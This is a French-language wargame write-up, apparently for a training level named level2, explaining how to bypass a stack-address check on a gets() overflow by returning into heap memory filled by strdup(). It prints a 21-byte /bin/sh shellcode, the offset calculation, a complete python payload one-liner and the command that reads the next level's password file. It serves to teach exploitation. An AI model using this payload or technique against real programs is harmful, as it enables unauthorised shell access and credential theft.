On a un code source avec la meme vulnerabilité qu'au level1, un gets() qui ne peut faire un stackoverflow
Sauf que cettef fois il y a une garde, si l'adresse de retour RET a un autre type d'adresse que celui de la stack a savoir qui commence par xb0
le programme exit(1)
donc on ne peux pas passer par la stack pour executer un shell
On voit que dans la fonction p() il y a un strdup() qui utilise un malloc() c'est a dire que le programme utilise la heap
Nous allons donc passer par la. Il va falloir rediriger le RET de la stack vers la heap et nous mettrons dans la heap un shellcode :

shellcode: \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 = 21 octets

Pour mettre le shellcode dans la heap il suffit de le mettre dans l'entre du programme et le dup fera le reste

il faut aussi determiner ou commence la heap pour mettre cette adresse dans le RET

on peut le faire avec :
ltrace ./level2

ce qui donne comme resultat strdup("") = 0x0804a008, la heap commence donc a 0x0804a008

il ne reste plus qu'a calculer l'offset a partir duquel on entre dans le RET, on le fait avec le script python en ressource

on trouve offset = 80

donc 80 - 21 (du shellcode) = 59

Nous avons tout les element en notre possession pour construire l'exploit :


python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "e"*59 + "\x08\xa0\x04\x08"' > /tmp/payload

on execute level2 avec : cat /tmp/payload - | ./level2 

C'est bon le shell est executé

cat /home/user/level3/.pass



